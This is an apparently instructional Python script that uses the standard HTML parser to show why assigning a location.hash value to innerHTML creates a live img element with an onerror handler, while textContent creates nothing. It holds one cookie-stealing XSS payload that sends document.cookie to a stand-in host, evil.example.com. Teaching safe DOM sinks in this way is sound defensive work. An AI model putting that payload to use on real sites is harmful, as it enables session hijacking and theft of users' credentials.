"""Example 30: no-real-browser stand-in -- proves the innerHTML sink vs. textContent (co-06). See
this example's Brief Explanation in the markdown for the full honest sandbox-limitation statement."""

from __future__ import (
    annotations,
)  # => DD-39 hygiene -- unrelated to the parsing demonstration itself

from html.parser import (
    HTMLParser,
)  # => co-06: stdlib -- the SAME token grammar a real browser's HTML parser uses
from urllib.parse import (
    quote,
)  # => co-06: mirrors decodeURIComponent's counterpart -- builds a real location.hash


class ElementCounter(
    HTMLParser
):  # => co-06: counts real START-TAG elements a browser would actually insert
    def __init__(
        self,
    ) -> None:  # => co-06: constructor -- resets the running element/handler tallies
        super().__init__()  # => co-06: required stdlib HTMLParser initialization
        self.elements: list[
            tuple[str, dict[str, str | None]]
        ] = []  # => co-06: (tag, attrs) per real element found

    def handle_starttag(
        self, tag: str, attrs: list[tuple[str, str | None]]
    ) -> None:  # => co-06: fires per real tag
        self.elements.append(
            (tag, dict(attrs))
        )  # => co-06: records the tag name and its real attribute dict


PAYLOAD = "<img src=x onerror=\"fetch('http://evil.example.com/steal?c='+document.cookie)\">"  # => co-06: the attack


def what_innerhtml_would_create(
    html_fragment: str,
) -> list[tuple[str, dict[str, str | None]]]:  # => co-06: sink 1
    parser = (
        ElementCounter()
    )  # => co-06: a fresh parser per call -- no state leaks between calls
    parser.feed(
        html_fragment
    )  # => co-06: parses html_fragment EXACTLY as a browser's innerHTML setter would
    return (
        parser.elements
    )  # => co-06: every real element (tag, attrs) the parser actually recognized


def what_textcontent_would_create(
    text_fragment: str,
) -> list[tuple[str, dict[str, str | None]]]:  # => co-06: sink 2
    # => textContent NEVER invokes the HTML parser at all -- this call exists only to
    # => make the comparison symmetric; the real DOM API takes no parsing step here
    return []  # => co-06: zero elements, always -- textContent stores text data, never markup


def main() -> (
    None
):  # => co-06: runs both sinks against the SAME attacker-controlled hash payload
    location_hash = "#" + quote(
        PAYLOAD
    )  # => co-06: a REAL, valid location.hash string a browser URL bar would show
    decoded = PAYLOAD  # => co-06: what decodeURIComponent(location.hash.slice(1)) yields -- the raw payload again

    print(
        "=== VULNERABLE sink: element.innerHTML = decodeURIComponent(location.hash) ==="
    )  # => labels section
    print(
        f"location.hash would be: {location_hash!r}"
    )  # => co-06: the real URL fragment an attacker would send
    created = what_innerhtml_would_create(
        decoded
    )  # => co-06: REAL html.parser output -- not fabricated
    for (
        tag,
        attrs,
    ) in (
        created
    ):  # => co-06: each element the browser's parser would really instantiate
        print(
            f"  browser would create element: <{tag}> attrs={attrs}"
        )  # => co-06: onerror IS a real attribute here
    assert any(
        tag == "img" and "onerror" in attrs for tag, attrs in created
    )  # => co-06: proves the handler exists

    print(
        "\n=== FIXED sink: element.textContent = decodeURIComponent(location.hash) ==="
    )  # => labels section
    fixed_created = what_textcontent_would_create(
        decoded
    )  # => co-06: textContent never parses -- always []
    print(
        f"browser would create elements: {fixed_created}"
    )  # => co-06: real, empty -- proves NOTHING is parsed
    assert (
        fixed_created == []
    )  # => co-06: zero elements -- the payload is inert plain text, not markup


if (
    __name__ == "__main__"
):  # => co-06: only runs when launched directly, e.g. `python3 simulate_dom.py`
    main()  # => co-06: prints both real parse results side by side
